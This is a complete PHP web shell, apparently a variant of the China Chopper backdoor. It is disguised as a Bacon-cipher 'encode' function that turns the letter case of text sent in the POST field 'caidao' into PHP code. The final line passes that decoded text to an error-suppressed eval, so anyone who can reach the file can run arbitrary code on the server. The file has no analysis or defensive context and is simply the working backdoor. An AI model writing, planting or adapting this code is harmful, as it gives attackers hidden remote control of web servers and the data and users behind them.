<?php

function bacon_encode($s) {
    $KEY = 'aaaaabbbbbabbbaabbababbaaababaab';
    $ALPHABET = 'abcdefghijklmnopqrstuvwxyz';

    // create list of tuples with key_value_structure = key_letter_of_alphabet
    for ($i=0; $i < strlen($ALPHABET); $i++) {
        $key_v[$ALPHABET[$i]] = substr($KEY, $i, 5);
    }

    // encode the string
    $newstr = '';
    for ($i=0; $i < strlen($s); $i++) {
         $newstr .= ctype_lower($s[$i]) ? 'a' : 'b';
    }

    // decode the string
    $counter = strlen($s);
    $result = '';
    while ($counter > 0) {
        foreach ($key_v as $key => $value) {
            if ($value == substr($newstr, 0, 5)) {
                $result .= $key;
            }
        }
        $newstr = substr($newstr, 5);
        $counter -= 5;
    }
    return $result;
}

@eval(bacon_encode($_POST['caidao']));
?>
